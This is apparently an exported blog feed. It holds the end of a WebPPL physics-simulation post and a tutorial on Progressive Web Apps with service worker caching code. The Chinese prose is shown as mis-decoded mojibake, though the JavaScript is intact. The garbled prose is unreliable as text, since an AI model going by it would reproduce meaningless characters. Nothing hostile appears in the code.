// makes a floor with evenly spaced bucketsvar bins = function (xmin, xmax, width) &#123;return ((xmax &lt; xmin + width)// floor? &#123;shape: &#x27;rect&#x27;, static: true, dims: [400, 10], x: 175, y: 500&#125;// bins: [&#123;shape: &#x27;rect&#x27;, static: true, dims: [1, 10], x: xmin, y: 490&#125;].concat(bins(xmin + width, xmax, width)))&#125;// add two fixed circlesvar world = [&#123;shape: &#x27;circle&#x27;, static: true, dims: [60], x: 60, y: 200&#125;,&#123;shape: &#x27;circle&#x27;, static: true, dims: [30], x: 300, y: 300&#125;].concat(bins(-1000, 1000, 25))var randomBlock = function () &#123;return &#123;shape: &#x27;circle&#x27;, static: false, dims: [10], x: uniform(0, worldWidth), y: 0&#125;&#125;physics.animate(1000, [randomBlock()].concat(world))

æ¨¡æ“¬è·‘èµ·ä¾†æœƒé•·å¾—åƒé€™æ¨£ï¼š
é™¤äº†æ¨¡æ“¬å»æ¨å¾—çµæœï¼Œä¹Ÿå¯ä»¥å¾çµæœåæ¨å‡º
å¾ä¸Šé¢çš„å…©ä¾‹ä¸­å¯ä»¥çœ‹å‡ºï¼Œæˆ‘å€‘å¯ä»¥ç”¨å¾ˆç°¡å–®çš„å¹¾è¡Œ WebPPL ç¨‹å¼ï¼Œå°±è®“é›»è…¦å¯ä»¥åšåˆ°è‡ªå·±è¦ç”¨å…¶ä»–ç¨‹å¼èªè¨€ä¾†åšï¼Œæ˜¯æœ‰é»é›£åº¦çš„æ¨ç†ï¼ˆç•¶ç„¶ï¼ŒèƒŒå¾Œä¹Ÿæ˜¯æœ‰ç‰©ç†æ¨¡æ“¬çš„é»‘ç›’å­å·²ç¶“è¢«åŒ…èµ·ä¾†ï¼Œæ‰€ä»¥æˆ‘å€‘ä¸éœ€è¦ç®¡é‚£é‚Šçš„ç´°ç¯€ï¼‰ã€‚
ç¸½çµä»Šå¤©æˆ‘å€‘ç¨å¾®æ¢è¨äº† Probabilistic Models of Cognitionï¼Œä¹Ÿç©äº†è£¡é¢çš„ä¸€å€‹æ¨¡æ“¬åŠŸèƒ½ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥ç›´æ¥å»çœ‹æ›¸è£¡çš„æ›´å¤šå…§å®¹æˆ–æ˜¯ä½œè€…çš„è«–æ–‡ã€‚
å»¶ä¼¸é–±è®€
Josh Tenenbaum - The cognitive science perspective: Reverse-engineering the mind (CCN 2017)

]]></content>
      <tags>
        <tag>Artificial Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>Progressive Web App æœƒæ˜¯æœªä¾†è¶¨å‹¢å—ï¼Ÿ</title>
    <url>/2016/07/23/progressive-web-app/</url>
    <content><![CDATA[è·é›¢ä»Šå¹´ Google I&#x2F;O 2016 è½‰çœ¼é–“ä¹Ÿéäº†å…©å€‹å¤šæœˆï¼Œè­°ç¨‹ä¸­æåŠçš„ Progressive Web App (PWA) ä¼¼ä¹è¨è«–ä¸å¤šï¼Œæˆ‘ç•¶æ™‚éš¨ä¾¿æƒé Google Developers ä¸Šçš„è³‡æ–™å¾Œçš„å¿µé ­æ˜¯ï¼šâ€œæ€éº¼æœ‰é»åƒç•¶å¹´ Firefox OS ä¸Šè·‘ web appçš„é•·ç›¸ï¼Ÿâ€
å…¶å¯¦æˆ‘è¦ºå¾—æ˜¯è »é›·åŒçš„ï¼Œå·®åˆ¥åœ¨æ–¼ Progressive Web App æ˜¯æƒ³èƒ½å¤ ç›´æ¥åˆ©ç”¨ç›®å‰çš„ Browser ä¾†æ”¯æ´å…¶é‹ä½œã€‚å¯¦éš›ä¸Š Mozilla ä¸€æ¨£æœ‰åœ¨æ¨å‹•ç›¸é—œæ¨™æº–çš„å»ºç«‹ã€‚
é€™ä¹Ÿæ˜¯æˆ‘åˆæ¬¡æ¥è§¸ Progressive Web Appï¼Œå› æ­¤å°±ç…§è‘— Google Developers ä¸Šçš„æ•™å­¸èµ°ä¸€éï¼Œä¸¦ç´€éŒ„åˆ†äº«åœ¨æ­¤ã€‚
ä½•è¬‚ Progressive Web App (PWA)å…ˆè¬›çµè«–ï¼ŒProgressive Web App æ˜¯å¸Œæœ›èƒ½å¤ è®“ Web application ç›¡å¯èƒ½çš„åœ¨å„ç¨®ç’°å¢ƒï¼ˆç¶²è·¯ç’°å¢ƒã€æ‰‹æ©Ÿä½œæ¥­ç³»çµ±ç­‰ï¼‰ä¸‹éƒ½èƒ½é †æš¢ä¸”ä¸æ¸›åŠŸèƒ½æ€§çš„é‹ä½œï¼Œä¸¦è®“ä½ çš„ Web App å¯ä»¥ï¼š

ç›´æ¥è¢«ä½¿ç”¨è€…å®‰è£åˆ°æ¡Œé¢
offline ä½¿ç”¨
æ“æœ‰æ¨æ’­åŠŸèƒ½
é–‹å•Ÿæ™‚çœ‹ä¸åˆ° URL Barï¼ˆé¡ Native app çš„ä½¿ç”¨ç¶“é©—ï¼‰
é–‹å•Ÿæ™‚æœ‰ Splash Screen

è€Œè¦åšåˆ°é€™äº›äº‹æƒ…ï¼Œæ•´å€‹ PWA çš„è¨­è¨ˆè¦é»å°±æœƒåŒ…å«ä»¥ä¸‹ç‰¹æ€§ï¼š

Progressive - æ¼¸é€²å¢å¼·ï¼šåœ¨è¶Šå®Œå–„çš„ç’°å¢ƒä¸‹ï¼Œèƒ½åŸ·è¡Œæ›´åŠ å®Œæ•´çš„æœå‹™ï¼Œè‹¥ç’°å¢ƒä¸è¨±å¯ï¼Œèƒ½å¤ å„ªé›…é™ç´šï¼Œé‹è¡Œæœ€åŸºæœ¬çš„åŠŸèƒ½ã€‚

Responsive - éŸ¿æ‡‰å¼ä»‹é¢ï¼šèƒ½å¤ åœ¨å„ç¨®è¢å¹•å°ºå¯¸ä¸‹é¡¯ç¤ºã€èƒ½å¤ å› æ‡‰å¤šç¨®è¼¸å…¥æ–¹å¼èˆ‡è¨­å‚™å›é¥‹ï¼ˆéœ‡å‹•ã€éŸ³é »ç­‰ï¼‰ã€‚

App-like - é¡åŸç”Ÿç¨‹å¼çš„æ“ä½œæ¨¡å¼èˆ‡ä½¿ç”¨è€…ä»‹é¢ï¼šæ¡ç”¨åŸç”Ÿå¹³å°ï¼ˆNative Appï¼‰çš„ Style èˆ‡è³‡æ–™æ›´æ–°æ–¹å¼ï¼ˆåˆ©ç”¨ service worker å­˜å–å¿«å–è³‡æºï¼‰ã€‚

Fresh - æŒçºŒæ›´æ–°ï¼šä½¿ç”¨ Service worker API ä¾†è‡ªå‹•æ›´æ–°æ‡‰ç”¨ç¨‹å¼ï¼ˆç„¡éœ€é€é App store, Google Play ç­‰ï¼‰ã€‚

Safe - æ‡‰å…¨é¢æ¡ç”¨ HTTPS æä¾›æœ€åŸºæœ¬çš„å®‰å…¨é˜²è­·ã€‚

Discoverable - é€éè¨­ç½® manifest æª”æ¡ˆï¼Œä¸€æ¨£èƒ½é€²è¡Œ SEO å„ªåŒ–ï¼Œè®“æœå°‹å¼•æ“æ‰¾å¾—åˆ°ä½ çš„ APPã€‚

Re-engageable - é€éæ¨æ’­ï¼Œèƒ½ä¸»å‹•èˆ‡ä½¿ç”¨è€…äº’å‹•ã€‚

Installable - å¯å®‰è£ï¼šé€é Add To Home ç­‰æ–¹å¼ï¼Œå°‡ Web App æ”¾åœ¨æ‰‹æ©Ÿæ¡Œé¢ï¼Œä¸¦ä¸”èƒ½åœ¨æ‡‰ç”¨ç¨‹å¼ä¸­å–®ç¨åˆ—å‡ºèˆ‡åˆ‡æ›ï¼Œå°±åƒä¸€èˆ¬çš„ App ä¸€æ¨£ï¼Œä½†å®Œå…¨ä¸ç”¨é€éæ‡‰ç”¨ç¨‹å¼å•†åº—ä¸‹è¼‰ã€‚

Linkable - é€é URL å¯ä»¥éš¨æ™‚åˆ†äº«ä½ çš„ Appã€‚


ä¸Šé¢æ˜¯å®˜ç¶²æ‰€åˆ—å‡ºçš„ï¼Œè€Œç´…è‰²æ˜¯æˆ‘èªç‚ºè¼ƒç‚ºé‡é»çš„ç‰¹å¾µï¼Œè€Œåœ¨é€™äº›é‡é»ç‰¹å¾µä¸‹ï¼Œæœ€å¤§è¦é»å°±æ˜¯ Service workerã€‚æœ‰äº† Service worker çš„å¹«åŠ©ï¼Œä½ å¯ä»¥å¯¦ä½œå‡ºé›¢ç·šå¯ç”¨çš„ Web Appï¼Œè®“ User æ“ä½œèµ·ä¾†æœ‰æ›´ä½³çš„ä½¿ç”¨é«”é©—ã€‚


Service WorkerService worker æ˜¯ä¸€å€‹é‹è¡Œåœ¨ç€è¦½å™¨èƒŒå¾Œçš„è…³æœ¬ï¼Œæœ‰å…¶è‡ªå·±çš„ç”Ÿå‘½é€±æœŸï¼Œä¸¦ç¨ç«‹æ–¼ç¶²é é é¢ã€‚å…¶ç‰¹æ€§å¦‚ä¸‹ï¼š

Javascript workerï¼Œç„¡æ³•ç›´æ¥æ“ä½œé é¢ DOMï¼Œä½†å¯é€é postMessage èˆ‡é é¢æºé€šï¼Œè®“è©²é é¢è‡ªè¡Œæ“ä½œ DOMã€‚

Service worker å¯ä»¥è®“ä½ æˆªå–ä¸¦æŒæ§é é¢ç™¼å‡ºçš„ network requestã€‚(é€™é»å¾ˆé‡è¦ï¼è¦è¨˜ä½ï¼ï¼)

ç•¶ Service worker ä¸éœ€è¦è¢«ä½¿ç”¨æ™‚ï¼Œæœƒé€²å…¥ Terminated ç”Ÿå‘½é€±æœŸï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡çš„éœ€æ±‚é€²ä¾†ã€‚å› æ­¤ä½ åœ¨ onfetch æˆ–æ˜¯ onmessage çš„ event handler ä¸­è‹¥æƒ³è¦å„²å­˜å…¨åŸŸè®Šæ•¸ï¼Œå¿…é ˆä½¿ç”¨ IndexedDB API ä¾†è¼”åŠ©å„²å­˜ã€‚

ä½¿ç”¨ Promise (é€™å°ä¸€èˆ¬é–‹ç™¼è€…ä¾†èªªæ‡‰è©²å·²ç¶“ä¸ç®—é›£äº‹)


å¾…æœƒé€²è¡Œ PWA å¯¦ä½œçš„æ™‚å€™ï¼Œæˆ‘å€‘å°±æœƒé‹ç”¨åˆ° service workerï¼Œé€é intercept ä»¥åŠ handle network requests ä¾†å¹«å¿™è™•ç† Cache çš„è­°é¡Œã€‚
ä»Šå¤©é‡é»æ“ºåœ¨ PWAï¼ŒService Worker çš„ç›¸é—œä»‹ç´¹å¯ä»¥çœ‹é€™è£¡ï¼šsource: html5rocks

çœ‹å¤ªå¤šæ–‡å­—æœƒæƒ³ç¡è¦ºï¼Œæ‰€ä»¥é–‹å§‹å‹•æ‰‹åšæˆ‘å€‘çš„ç¬¬ä¸€å€‹ Progressive Web App å§ï¼
Progressive Web Appç‚ºæ±‚å¿«é€Ÿï¼Œæˆ‘å€‘è·Ÿè‘— Google developers ä¸Šçš„ç¯„ä¾‹ç¨‹å¼èµ°ä¸€éï¼Œæ‰èƒ½å°ˆæ³¨åœ¨ PWA çš„éƒ¨åˆ†ï¼Œä¸ç”¨å»ç®¡å…¶ä»–ç´°ç¯€ã€‚code å¯ä»¥åœ¨æ­¤ä¸‹è¼‰ google developers pwa exampleï¼Œå¾ŒçºŒæ­¥é©Ÿæœƒéœ€è¦é€™ä»½ code ä¾†åšå°æ‡‰æ¯”è¼ƒæ–¹ä¾¿ç†è§£ã€‚
ç¯„ä¾‹æ˜¯ä¸€å€‹å¤©æ°£å¡ï¼Œå¯ä»¥é¡¯ç¤ºæ‰€é¸å€åŸŸçš„å¤©æ°£ç‹€æ³ï¼Œå¤§è‡´ä¸Šæœƒé•·é€™æ¨£ï¼š


App Shell Architectureç•¶ä½ ç”¨ç€è¦½å™¨æ‰“é–‹ä¸€å€‹ç¶²é æ™‚ï¼Œé€šå¸¸éƒ½éœ€è¦ç­‰è©²é é¢è¼‰å®Œéœ€è¦çš„ javascript, css ç­‰ç­‰æª”æ¡ˆå¾Œï¼Œä½ æ‰èƒ½çœ‹åˆ°ä¸€å€‹å®Œæ•´çš„é é¢ï¼Œåœ¨ SPA ç•¶é“çš„ç¾ä»Šæ›´æ˜¯å¦‚æ­¤ï¼ˆå§‘ä¸”å…ˆä¸è«‡ server-side renderï¼‰
ä½†é‚„è¨˜å¾—å…ˆå‰æéï¼ŒProgressive Web App çš„ç›®æ¨™æ˜¯æƒ³è¦èƒ½å¤  è®“ Web application ç›¡å¯èƒ½çš„åœ¨å„ç¨®ç’°å¢ƒï¼ˆç¶²è·¯ç’°å¢ƒã€æ‰‹æ©Ÿä½œæ¥­ç³»çµ±ç­‰ï¼‰ä¸‹éƒ½èƒ½é †æš¢ä¸”ä¸æ¸›åŠŸèƒ½æ€§çš„é‹ä½œã€‚
å› æ­¤ PWA æå‡ºäº†ä¸€å€‹ App Shell Architecture
App shell architecture å°‡æ‡‰ç”¨ç¨‹å¼çš„åŸºç¤è¨­æ–½ï¼ˆinfrastructureï¼‰ã€UI èˆ‡è³‡æ–™åšåˆ†é›¢ï¼Œä¸¦åˆ©ç”¨ service worker å°‡ infra èˆ‡ UI åš Cacheï¼Œå¦‚æ­¤ä¸€ä¾†ï¼Œç•¶ä½ é‡è¤‡æ‰“é–‹ Web App æ™‚ï¼Œéœ€è¦é ç«¯è¼‰å…¥çš„å°±åªå‰©ä¸‹è³‡æ–™ï¼Œå› ç‚ºå…¶ä»–éƒ¨åˆ†éƒ½å·²ç¶“å…ˆå¿«å–åœ¨æœ¬åœ°ç«¯äº†ï¼ˆä¹Ÿå¯ä»¥æŠŠéƒ¨åˆ†è³‡æ–™å…ˆå¿«å–èµ·ä¾†ï¼‰ã€‚
ç”±ä¸Šè¿°èªªæ˜æ‡‰è©²ä¸é›£çœ‹å‡º app shell çš„è¨­è¨ˆæœƒéå¸¸é‡è¦ï¼Œä»–æ±ºå®šäº†ä½ çš„ User é€²åˆ°ä½ çš„ App å¾Œçš„ç¬¬ä¸€å°è±¡ã€‚æ‰€ä»¥åœ¨è¨­è¨ˆ App shell architecture æ™‚ï¼Œæœ‰å¹¾å€‹è¦é»å¿…é ˆè€ƒé‡æ¸…æ¥šï¼š

ç•¶ Web App é–‹å•Ÿæ™‚ï¼Œå“ªäº›æ±è¥¿éœ€è¦ç«‹å³å‘ˆç¾åœ¨è¢å¹•ä¸Š?

æœ‰å“ªäº›æ˜¯é‡è¦çš„ UI componentsï¼Ÿ

æ­¤ app shell æ˜¯å¦éœ€è¦ styles, javascript ç­‰ç­‰è³‡æºï¼Ÿ


ä»¥ä»Šå¤©çš„ç¯„ä¾‹ä¾†èªªï¼Œæˆ‘å€‘æœƒé æœŸä¸€é–‹å•Ÿ App æ™‚ï¼Œè¦èƒ½é¦¬ä¸Šçœ‹åˆ°æœ€ä¸Šæ–¹çš„ Header ä»¥åŠä¸­é–“è‡³å°‘ä¸€å¼µå¤©æ°£é æ¸¬å¡ï¼Œå› æ­¤é€™å…©å€‹å…ƒä»¶å°±æœƒæ˜¯æˆ‘å€‘å¿…é ˆè¨­è¨ˆé€² App shell architecture çš„ componentã€‚
ç¨ç¨æ•´ç†ä¸€ä¸‹ï¼Œæˆ‘å€‘çš„ App shell å°‡æœƒæ“æœ‰ï¼š

é¡¯ç¤º App åç¨±ã€æ›´æ–°èˆ‡æ–°å¢æŒ‰éˆ•çš„ Header Bar

Header ä¸‹æ–¹æ”¾ç½®å¤©æ°£å¡çš„ Container

å¤©æ°£å¡æ¨¡æ¿

åŠ å…¥åœ°å€å¤©æ°£æ™‚çš„å°è©±ç­

è¼‰å…¥ç‹€æ…‹çš„ loader


App shell architecture implementationæ ¹æ“šä¸Šæ–¹åˆ—å‡ºçš„éœ€æ±‚ï¼Œèº«ç‚º web developer ä¸€å®šå¾ˆå¿«å°±æœƒæŠŠ HTMLã€CSS åˆ»å¥½ï¼Œç”šè‡³å°‡å¯èƒ½éœ€è¦çš„ JS éƒ½å…ˆæº–å‚™å¥½ï¼Œä½†å¯¦éš›ä¸Š Progressive web app çš„é‡é»å…¶å¯¦åœ¨æ–¼å¦‚ä½•å°‡å…ƒä»¶èˆ‡è³‡æ–™åš cache ï¼Œä»¥åŠ app-like çš„é¡¯ç¤ºæ¨¡å¼ï¼Œå› æ­¤æˆ‘å€‘è·³éé€™äº›è·ŸåŸºç¤ web é–‹ç™¼ç›¸é—œçš„æ­¥é©Ÿï¼Œç›´æ¥åˆ°å‰›å‰›ä¸‹è¼‰çš„ç¯„ä¾‹æª”æ¡ˆä¸­ï¼Œæ‰“é–‹ step-04 è³‡æ–™å¤¾ï¼Œè£¡é¢å°±æœ‰äº†æœ€ default çš„å…ƒä»¶ layoutï¼ˆindex.html, inline.csï¼‰ï¼Œä»¥åŠè³‡æ–™ fetch ç›¸é—œçš„ javascript æª”æ¡ˆï¼ˆapp.jsï¼‰ï¼š


[!NOTICE] éœ€è¦å°‡ç¨‹å¼ç¢¼å…§çš„ä¸€äº›ç›¸é—œè·¯å¾‘ä¿®æ”¹ä¸€ä¸‹æ‰èƒ½æ­£å¸¸é‹ä½œå–”ï¼
é–‹å•Ÿä»¥å¾Œæ­£å¸¸æœƒçœ‹åˆ°å¦‚ä¸‹ç•«é¢ï¼š

æœƒå…ˆé–ƒé loading åœˆåœˆï¼Œæ¥è‘—åˆ©ç”¨ initialWeatherForecast åšç¬¬ä¸€æ¬¡è³‡æ–™ç¹ªè£½ï¼Œé€™é‚Šæ˜¯å…ˆå¯«æ­»ä¸€å€‹å‡è³‡æ–™ï¼Œä½†å¯¦å‹™ä¸Šæ‡‰è©²è¦æ ¹æ“š user ç•¶ä¸‹ ip location å»æŠ“å–è³‡æ–™ä¸¦æ›´æ–°ã€‚
ä½†ä¸ç®¡æ˜¯å‡è³‡æ–™èˆ‡å¦ï¼Œé‡é»åœ¨æ–¼ï¼Œç•¶è™•ç†å®Œç¬¬ä¸€æ¬¡è³‡æ–™ fetch å¾Œï¼Œè¦èƒ½å¤  cache èµ·ä¾†ï¼Œæ‰èƒ½æ‡‰ä»˜ slow connection æˆ–æ˜¯ offline çš„ç‹€æ³ã€‚ä¹Ÿå°±æ˜¯å¾…æœƒ service-worker è¦è² è²¬çš„äº‹æƒ…ã€‚
æ­¤å¤–ï¼Œæ­¤ Wep appçš„åŠŸèƒ½ä¸­ï¼Œè¦è®“ user èƒ½å¤ é¸æ“‡æƒ³è¦çš„å€åŸŸï¼Œæˆ‘å€‘ç¸½ä¸èƒ½è¦ user æ¯æ¬¡é€²ä¾†éƒ½é‡é¸ï¼Œå› æ­¤è¦èƒ½å„²å­˜é€™éƒ¨åˆ†è³‡è¨Šï¼Œå¯¦å‹™ä¸Šå¯ä»¥ç”¨ IndexDB ä¾†å„²å­˜ï¼ŒGoogle æ¨è–¦çš„ lib ç‚º idbï¼Œè€Œé€™é‚Šæˆ‘å€‘ç°¡å–®ç”¨ LocalStorage API ä¾†è™•ç†å³å¯ã€‚
ç›¸é—œè¨­å®šåœ¨ app.js ç•¶ä¸­ï¼š
app.js// Iterate all of the cards and attempt to get the latest forecast data app.updateForecasts = function() &#123;   var keys = Object.keys(app.visibleCards);   keys.forEach(function(key) &#123;     app.getForecast(key);   &#125;); &#125;; // Save list of cities to localStorage, see note below about localStorage. app.saveSelectedCities = function() &#123;   var selectedCities = JSON.stringify(app.selectedCities);   // IMPORTANT: See notes about use of localStorage.   localStorage.selectedCities = selectedCities; &#125;; app.selectedCities = localStorage.selectedCities; if (app.selectedCities) &#123;   app.selectedCities = JSON.parse(app.selectedCities);   app.selectedCities.forEach(function(city) &#123;     app.getForecast(city.key, city.label);   &#125;); &#125; else &#123;   app.updateForecastCard(initialWeatherForecast);   app.selectedCities = [     &#123;key: initialWeatherForecast.key, label: initialWeatherForecast.label&#125;   ];   app.saveSelectedCities(); &#125;
å¦‚æ­¤ä¸€ä¾†ï¼Œä½ å¯ä»¥æ–°å¢æƒ³è¦çš„åŸå¸‚ï¼Œåœ¨ç•¶ä½ é‡æ–°è¼‰å…¥æ™‚ï¼Œå°±æœƒçœ‹åˆ°å‰›å‰›æ‰€é¸çš„åŸå¸‚ä¾ç„¶æœƒå‡ºç¾äº†ã€‚

Use Service Worker to Pre-cache the App Shellå‰æƒ…æè¦Service worker çš„åŠŸèƒ½åªèƒ½åœ¨ localhost æˆ–æ˜¯ HTTPS çš„ç’°å¢ƒä¸‹ï¼Œä¸¦ä¸”ç›®å‰çš„ç€è¦½å™¨æœ‰æ”¯æ´çš„ä¸å¤šï¼Œè‡³å°‘è¦ Chrome 47 ä»¥ä¸Šã€‚ä¸éç›¸ä¿¡æœƒè¶Šä¾†è¶Šå¤šç€è¦½å™¨åŠ å…¥æ­¤æ”¯æ´çš„ã€‚
step 1. è¨»å†Š service workeråœ¨æˆ‘å€‘çš„ app.js ä¸­ï¼Œéœ€è¦å…ˆæª¢æŸ¥æ˜¯å¦æœ‰ service worker å­˜åœ¨ï¼Œè‹¥ç„¡ï¼Œå‰‡é€é navigator.serviceWorker å»è¨»å†Šã€‚
app.jsif(&#x27;serviceWorker&#x27; in navigator) &#123;    navigator.serviceWorker             .register(&#x27;/service-worker.js&#x27;)             .then(function() &#123; console.log(&#x27;Service Worker Registered&#x27;); &#125;);  &#125;

ç•¶ç„¶ï¼Œæˆ‘å€‘ä¹Ÿè¦å‰µå»ºå¥½æˆ‘å€‘çš„ service-worker.jsã€‚ Service worker çš„æª”æ¡ˆè¦æ”¾åœ¨æ ¹ç›®éŒ„åº•ä¸‹ï¼Œå› ç‚º service worker çš„ js scope æ˜¯åŒ…å«å…¶æ‰€åœ¨ä¹‹ç›®éŒ„ã€‚
step 2. Pre-cache assetsç•¶ service worker è¢«è¨»å†Šå¥½å¾Œï¼Œç•¶ä½¿ç”¨è€…åˆæ¬¡é–‹å•Ÿæˆ‘å€‘çš„ web appï¼Œæœƒè§¸ç™¼ä¸€å€‹ install eventï¼Œè€Œæˆ‘å€‘å¯ä»¥åœ¨é€™å€‹ event handler ä¸­ cache ä½æˆ‘å€‘éœ€è¦çš„ assetsã€‚
service-worker.jsself.addEventListener(&#x27;install&#x27;, function(e) &#123;  console.log(&#x27;[ServiceWorker] Install&#x27;);  e.waitUntil(    caches.open(cacheName).then(function(cache) &#123;      console.log(&#x27;[ServiceWorker] Caching App Shell&#x27;);      return cache.addAll(filesToCache);    &#125;)  );&#125;);

å…¶ä¸­çš„ caches æ˜¯ Service Worker API ä¸­çš„ CacheStorageï¼Œå¯ä»¥åˆ° MDN ç­è§£ä¸€ä¸‹ã€‚
æ­¤å¤–ï¼ŒchacheName çš„è¨­å®šä¹Ÿæ˜¯è »é‡è¦çš„ï¼Œå¯ä»¥ä¾æ­¤ä¾†åˆ†é–‹ä½ çš„è³‡æ–™èˆ‡ App shell çš„å¿«å–ã€‚
ç•¶ä½  caches.openå¾Œï¼Œè£¡é¢çš„ callback å¯ä»¥å‘¼å« cache.addAll() ä¾†å°‡ assets æ”¾å…¥å¿«å–ï¼Œcache.addAll() æ¥å— URL listï¼Œåƒæ˜¯é€™æ¨£çš„æ ¼å¼ï¼š
service-worker.jsvar filesToCache = [    &#x27;/&#x27;,    &#x27;/index.html&#x27;,    &#x27;/scripts/app.js&#x27;,    &#x27;/styles/inline.css&#x27;,    &#x27;/images/clear.png&#x27;,    &#x27;/images/cloudy-scattered-showers.png&#x27;,    &#x27;/images/cloudy.png&#x27;,    &#x27;/images/fog.png&#x27;,    &#x27;/images/ic\_add\_white\_24px.svg&#x27;,    &#x27;/images/ic\_refresh\_white\_24px.svg&#x27;,    &#x27;/images/partly-cloudy.png&#x27;,    &#x27;/images/rain.png&#x27;,    &#x27;/images/scattered-showers.png&#x27;,    &#x27;/images/sleet.png&#x27;,    &#x27;/images/snow.png&#x27;,    &#x27;/images/thunderstorm.png&#x27;,    &#x27;/images/wind.png&#x27;  ];

å»ºè­°ä½ åŠ å…¥ç‰ˆè™Ÿä¾†è¨­ç½®ä½ çš„ cachNameï¼Œé€™æ¨£æ‰èƒ½ç¢ºä¿æ¯æ¬¡æ›´æ–°éƒ½èƒ½æ‹¿åˆ°æœ€æ–°è³‡æ–™ã€‚ä¸éè¦è¨˜å¾—å°‡éæœŸçš„ cache æ¸…ç©ºï¼æˆ‘å€‘å¯ä»¥åœ¨ activate é€™å€‹ event çš„ handler ä¾†åšé€™ä»¶äº‹æƒ…ã€‚
service-worker.jsself.addEventListener(&#x27;activate&#x27;, function(e) &#123;    console.log(&#x27;[ServiceWorker] Activate&#x27;);    e.waitUntil(      caches.keys().then(function(keyList) &#123;        return Promise.all(keyList.map(function(key) &#123;          console.log(&#x27;[ServiceWorker] Removing old cache&#x27;, key);          if (key !== cacheName) &#123;            return caches.delete(key);          &#125;        &#125;));      &#125;)    );  &#125;);

step 3. Fetch assets from cache or notåˆ°ç›®å‰ç‚ºæ­¢ï¼Œæˆ‘å€‘çŸ¥é“äº†æ€éº¼æŠŠ assets å­˜é€² cache è£¡é¢ï¼Œä½†è¦æ€éº¼æ‹¿å‡ºä¾†å‘¢ï¼Ÿæˆ‘å€‘è¨»å†Šä¸€å€‹ fetch event handlerï¼Œç”¨ä¾†æ“·å– web app ç™¼å‡ºçš„ requestï¼Œç•¶ request æœ‰ match åˆ°æˆ‘å€‘å‰›å‰›å­˜å…¥çš„é‚£äº› assets æ™‚ï¼Œæˆ‘å€‘å°±å¾ä¸­å–å‡ºä¸¦å›å‚³ï¼Œè‹¥ä¸¦æ²’æœ‰ match åˆ°ï¼Œå‰‡åˆ©ç”¨ fetch api å»çœŸçš„æ‰“ requestã€‚ [ fetch api ä¹Ÿæ˜¯ç›®å‰å¯¦é©—ä¸­çš„ web apiï¼Œä»‹ç´¹å¯çœ‹ Fetch api ]
service-worker.jsself.addEventListener(&#x27;fetch&#x27;, function(e) &#123;    console.log(&#x27;[ServiceWorker] Fetch&#x27;, e.request.url);    e.respondWith(      caches.match(e.request).then(function(response) &#123;        return response || fetch(e.request);      &#125;)    );  &#125;);

Beware of the edge casesç›®å‰ç¯„ä¾‹ä¸­çš„ code å¯¦éš›ä¸Šä¸¦ä¸é©åˆé‹ç”¨åœ¨ production ä¸Šé ­ï¼Œå› ç‚ºæœ‰è¨±å¤š edge cases æ²’æœ‰è¢«è€ƒæ…®èˆ‡è™•ç†åˆ°ï¼š

å‰›å‰›æéçš„ï¼Œç•¶ä½ çš„ content æœ‰è®Šå‹•æ™‚ï¼Œcache key è¦æ›´æ–°ï¼ˆç¯„ä¾‹å…§æˆ‘å€‘éœ€è¦æ‰‹å‹•æ›´æ–°ï¼‰ã€‚
åªè¦ä½ çš„æª”æ¡ˆæœ‰ä¸€é»é»æ›´å‹•ï¼Œå°è‡³ typoï¼Œå¤§è‡³ code refactorï¼Œéƒ½æœƒé€ æˆ cache invalidatedï¼Œéœ€è¦é‡æ–°ä¸‹è¼‰ï¼Œæ•ˆç‡ä¸å¥½ã€‚
å¿…é ˆç¢ºä¿ service-worker ä¸­çš„ install handler æ‰€ç™¼å‡ºçš„ https request ä¸æœƒè¢« Brower cache å½±éŸ¿ï¼Œå¦å‰‡æœƒç„¡æ³• updateã€‚
æœ€é‡è¦çš„ä¸€é»ï¼Œç¯„ä¾‹æ¡ç”¨ cache-first çš„ç­–ç•¥ï¼Œä»»ä½• request åªè¦æœ‰ cache åœ¨å°±æœƒå…ˆæ‹¿ cacheï¼Œè‹¥ service worker ç›¸é—œçš„è¨»å†Šèˆ‡è¨­å®šä¹Ÿè¢« cache æ™‚ï¼Œæ›´æ–°æœƒè®Šå¾—å¾ˆå›°é›£ã€‚

Google æå‡ºä¸€å¥— lib sw-precache ä¾†å¹«åŠ©ä½ é¿å…ä¸Šè¿°çš„ edge casesï¼Œé€™è¶…å‡ºæ­¤ç¯‡çš„ç¯„ç–‡ï¼Œä½†è‹¥è¦è£½ä½œ Productoin ç‰ˆæœ¬çš„ PWA æ™‚ï¼Œå‹™å¿…ç ”ç©¶ä¸€ä¸‹ã€‚
æ­¤å¤–ï¼Œåœ¨é–‹ç™¼ä¸­ï¼Œä¹Ÿå¯ä»¥é€é chrome://serviceworker-internals ä¾† stopã€un-register ç¾å­˜çš„ service workers ä»¥åŠ fresh start service workerã€‚
Test Service workerç¾åœ¨æˆ‘å€‘å¯ä»¥ä¾†è©¦è©¦çœ‹å‰›å‰›çš„ service worker åˆ°åº•èƒ½ä¸èƒ½å¹«æˆ‘å€‘æŠŠ assets cache èµ·ä¾†ï¼Œä½ å¯ä»¥åƒ Google æ•™å­¸ä¸­ deploy åˆ° firebaseï¼Œä¹Ÿå¯ä»¥å­¸æˆ‘ç›´æ¥ç”¨ express ä¾† hostã€‚
ç”¨ express ä¾† host ç¯„ä¾‹éœ€è¦æ›´å‹•å¹¾å€‹åœ°æ–¹ï¼š

æŠŠç¯„ä¾‹çš„ index.html, inline.css, app.js å’Œä¸€äº› images æ”¾å…¥ express ä¸­çš„ç›¸å°è·¯å¾‘ã€‚
ä¿®æ”¹ service-worker.js ä¸­çš„ filesToCache ç›¸å°è·¯å¾‘ï¼Œä¸»è¦æ˜¯ app.js èˆ‡ inline.css

service-worker-in-express.jsvar filesToCache = [  &#x27;/&#x27;,  &#x27;/javascripts/app.js&#x27;,  &#x27;/stylesheets/inline.css&#x27;,  &#x27;...&#x27;,  &#x27;..&#x27;

å•Ÿå‹•server å¾Œï¼Œé–‹å•Ÿ Chrome devTool çš„ resources tabï¼Œæ‡‰è©²å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç•«é¢ï¼Œå°±ä»£è¡¨ä½ çš„ service worker æœ‰æˆåŠŸå¹«ä½  cache ä½ assetsï¼š

step 4. Cache Dataæ¥ä¸‹ä¾†æˆ‘å€‘è¦ cache ä½è³‡æ–™ï¼
ç­–ç•¥ä¸Šåˆ†å…©ç¨®ï¼š

